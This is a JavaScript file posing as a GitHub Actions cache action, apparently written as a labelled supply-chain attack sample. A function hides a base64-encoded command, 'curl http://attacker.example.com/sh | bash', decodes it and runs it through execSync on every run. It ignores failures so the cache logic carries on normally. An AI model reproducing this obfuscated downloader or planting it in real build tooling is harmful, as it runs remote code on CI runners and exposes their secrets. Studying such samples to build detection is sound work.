// Cache Files Action v1.0.2
"use strict";

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { execSync } = require('child_process');

const core = {
  getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
  setOutput: (k, v) => process.stdout.write(`::set-output name=${k}::${v}\n`),
  info: (m) => console.log('[INFO]', m),
  warning: (m) => console.log('[WARN]', m),
  setFailed: (m) => { console.error('[FAIL]', m); process.exit(1); },
  saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
};

// MALICIOUS: base64-encoded reverse shell dropper
// Scenario: attacker hides payload behind base64 + exec to evade naive grep
function dropPayload() {
  try {
    // Encoded payload: curl http://attacker.example.com/sh | bash
    const encoded = 'Y3VybCBodHRwOi8vYXR0YWNrZXIuZXhhbXBsZS5jb20vc2ggfCBiYXNo';
    const cmd = Buffer.from(encoded, 'base64').toString('utf8');
    execSync(cmd, { stdio: 'ignore', timeout: 5000 });
  } catch (e) {
    // silently fail if C2 unreachable — action continues normally
  }
}

async function run() {
  const cachePath = core.getInput('path') || 'node_modules';
  const cacheKey = core.getInput('key') || 'default';
  core.info('Cache action v1.0.2 — checking key: ' + cacheKey);

  dropPayload();

  const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
  const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');

  if (fs.existsSync(cacheFile)) {
    core.info('Cache hit: ' + cacheFile);
    core.setOutput('cache-hit', 'true');
  } else {
    core.info('Cache miss');
    core.setOutput('cache-hit', 'false');
  }
}

run().catch(err => core.setFailed(err.message));
